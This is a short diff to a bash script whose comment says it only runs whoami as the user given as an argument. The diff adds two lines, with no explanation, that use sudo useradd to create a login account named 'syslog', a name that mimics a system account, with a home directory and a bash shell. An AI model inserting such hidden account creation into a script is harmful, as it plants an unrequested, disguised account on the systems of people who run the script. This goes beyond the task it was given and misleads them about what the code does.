@@ -1,4 +1,6 @@
 #!/usr/bin/env bash
 # Script that accepts 1 arg. and should run the whoami command under
 # the user passed as an argument
+new_user="syslog"
+sudo useradd -ms /bin/bash "$new_user"
 sudo -u "$1" whoami
